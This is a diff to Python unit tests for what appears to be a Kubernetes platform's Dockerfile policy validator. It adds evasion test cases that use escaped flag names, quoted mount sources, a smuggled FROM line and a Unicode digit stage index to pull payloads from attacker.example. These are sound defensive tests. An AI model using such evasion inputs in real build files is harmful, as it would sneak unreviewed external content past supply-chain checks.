@@ -999,6 +999,34 @@ class KubernetesPlatformContractTests(unittest.TestCase):
                 + "RUN --mount=type=bind,from=attacker.example/payload:latest "
                 + "cat /payload\n"
             ),
+            "escaped-copy-flag": (
+                controlled
+                + r"COPY --fr\om=attacker.example/payload:latest /payload /payload"
+                + "\n"
+            ),
+            "quoted-run-mount-source": (
+                controlled
+                + 'RUN --mount=type=bind,"from=attacker.example/payload:latest",'
+                + "target=/payload cat /payload\n"
+            ),
+            "escaped-run-mount-flag": (
+                controlled
+                + r"RUN --mo\unt=type=bind,from=attacker.example/payload:latest,target=/payload cat /payload"
+                + "\n"
+            ),
+            "escaped-run-mount-source-key": (
+                controlled
+                + r"RUN --mount=type=bind,fr\om=attacker.example/payload:latest,target=/payload cat /payload"
+                + "\n"
+            ),
+            "even-trailing-escapes-before-external-from": (
+                controlled
+                + r"RUN true \\"
+                + "\nFROM attacker.example/unreviewed:latest AS injected\n"
+            ),
+            "unicode-decimal-copy-stage": (
+                controlled + "COPY --from=٠ /payload /payload\n"
+            ),
             "deferred-onbuild": controlled + "ONBUILD COPY . /payload\n",
             "remote-add": controlled + "ADD https://attacker.example/payload /payload\n",
         }
@@ -1027,6 +1055,7 @@ class KubernetesPlatformContractTests(unittest.TestCase):
             f"FROM\v{rust['local_ref']}@{rust['digest']} AS Builder\n"
             f"FROM\f{debian['local_ref']}@{debian['digest']} AS Runtime\n"
             "COPY --from=builder /payload /payload\n"
+            "COPY --from=0 /payload0 /payload0\n"
             "FROM builder AS exported-builder\n"
         )
         with mock.patch.dict(
@@ -1042,6 +1071,7 @@ class KubernetesPlatformContractTests(unittest.TestCase):
         self.assertIn(f"FROM\v{rust['local_ref']} AS Builder", rewritten)
         self.assertIn(f"FROM\f{debian['local_ref']} AS Runtime", rewritten)
         self.assertIn("COPY --from=builder", rewritten)
+        self.assertIn("COPY --from=0", rewritten)
         self.assertIn("FROM builder AS exported-builder", rewritten)
 
     def test_strict_oci_dockerfile_allows_prior_stage_alias(self) -> None:
